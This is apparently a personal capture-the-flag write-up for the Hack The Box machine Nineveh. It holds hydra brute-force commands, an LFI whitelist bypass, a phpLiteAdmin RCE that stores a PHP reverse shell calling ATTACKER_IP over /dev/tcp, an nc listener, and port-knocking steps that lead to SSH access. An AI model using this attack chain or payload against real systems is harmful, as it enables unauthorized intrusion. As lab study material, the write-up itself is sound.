HTB Nineveh

Target: 10.129.95.231
OS: Linux
Difficulty: Medium

Enumeration

Nmap showed port 80 (HTTP) and port 443 (HTTPS) open. Port 22 (SSH) was closed due to port knocking via knockd.

Port 80: "Under Construction" page with an image
Port 443: phpLiteAdmin v1.9 at /db/index.php, department login at /department/login.php

The department app is a Markdown/Notes viewer with a page parameter: index.php?page=
The app has a Contact Us form, About Us, and Donate pages.

Brute Forcing Logins

Two separate logins with different credentials, both cracked with hydra.

Department login (port 80):
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.95.231 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64

Username enumeration was possible because the app returns "Invalid username" vs "Invalid Password" depending on which is wrong.

phpLiteAdmin (port 443):
hydra -l none -P /usr/share/wordlists/rockyou.txt 10.129.95.231 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64

The -l none flag is used because phpLiteAdmin only has a password field, no username. Hydra requires the flag so "none" is passed as a placeholder.

Local File Inclusion (LFI)

The department app at /department/manage.php?notes= has an LFI vulnerability.
The source code does: include('files/' . $notes)

Using an absolute path bypasses the files/ prefix:
/department/manage.php?notes=/etc/passwd

Important: the LFI has a whitelist restriction. It only includes files that contain "ninevehNotes" in the filename. This is why normal traversal paths like ../../../etc/passwd may not work directly but absolute paths to files with the right name do.

PHP wrappers like php://filter returned "File name too long" because the base64 output was being treated as a filename by the application.

phpLiteAdmin RCE (CVE exploit-db 24044)

phpLiteAdmin v1.9 has a remote code execution vulnerability. The attack:

1. Create a new database named ninevehNotes.txt.php
   The name must contain "ninevehNotes" to satisfy the LFI whitelist
   The .php extension ensures PHP execution when included

2. Create a table (name doesn't matter, e.g. "shell")
   Field name: anything (e.g. "payload")
   Type: TEXT

3. Insert a row with PHP code as the value:
   <?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1'"); ?>

   Note: putting PHP in the "Default Value" field during table creation may not work because phpLiteAdmin strips or mangles the quotes. Inserting a row after table creation works better.

4. The database file is saved to /var/tmp/ninevehNotes.txt.php

5. Trigger via LFI:
   https://TARGET/department/manage.php?notes=/var/tmp/ninevehNotes.txt.php

6. The PHP code inside the SQLite database file gets executed, sending a reverse shell

Set up listener first: nc -lvnp 1337

Got shell as www-data.

SSH Key and Port Knocking

From the www-data shell, found an RSA private key (hidden in an image file in the secure_notes directory, extracted with strings command).

SSH port 22 was not visible on initial nmap scan because of knockd (port knock daemon).

Read the knock sequence from /etc/knockd.conf on the box. The sequence was: 571, 290, 911

Port knocking opens SSH temporarily by running an iptables rule when the correct port sequence is hit.

Knock command from Kali:
for x in 571 290 911; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.129.95.231; done

Immediately after knocking:
chmod 600 key.rsa
ssh -i key.rsa amrois@10.129.95.231

Got user shell as amrois. User flag at /home/amrois/user.txt

Port Knocking Notes

knockd is a daemon that hides services behind a secret port sequence
Config file lives at /etc/knockd.conf
Check for it from inside a box when SSH appears closed:
cat /etc/knockd.conf
which knockd
ps aux | grep knockd

A typical knockd.conf has an open and close sequence:
[openSSH]
sequence = 571,290,911
command = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT

[closeSSH]
sequence = 911,290,571
command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT

Privilege Escalation

TODO: check sudo -l, SUID binaries, cron jobs, group memberships

Key Lessons

1. Separate logins have separate credentials. Always brute force each one individually
2. Username enumeration through different error messages ("Invalid username" vs "Invalid Password") lets you confirm valid users before password attacks
3. hydra uses -l none when there's no username field (like phpLiteAdmin)
4. LFI apps can have whitelist restrictions on filenames. Name your malicious files to match
5. phpLiteAdmin databases are just files on disk. Name the database with a .php extension and it becomes executable via LFI
6. PHP inside SQLite database files executes when included via LFI, regardless of the file being a database. include() parses any PHP tags it finds
7. Inserting rows works better than default values for storing PHP payloads in phpLiteAdmin (quote handling)
8. php://filter wrapper returning "File name too long" means the output is being used as a path, not displayed
9. Port knocking hides services from nmap scans. Always check /etc/knockd.conf from inside a box
10. After port knocking, connect immediately as the port may close on a timeout
11. When you get a shell, always look for hidden services that were invisible from the outside
